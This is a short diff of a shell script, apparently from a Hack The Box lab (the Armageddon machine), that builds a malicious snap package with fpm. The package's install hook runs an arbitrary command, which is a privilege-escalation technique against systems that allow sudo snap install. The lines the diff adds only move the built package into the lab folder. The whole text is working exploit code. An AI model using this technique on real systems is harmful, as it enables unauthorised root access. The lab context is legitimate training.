@@ -4,3 +4,5 @@ mkdir -p meta/hooks
 printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
 chmod +x meta/hooks/install
 sudo fpm -n xxxx -s dir -t snap -a all meta
+mv xxxx_1.0_all.snap /home/kali/HTB/Machines/Armageddon_NF
+cd /home/kali/HTB/Machines/Armageddon_NF
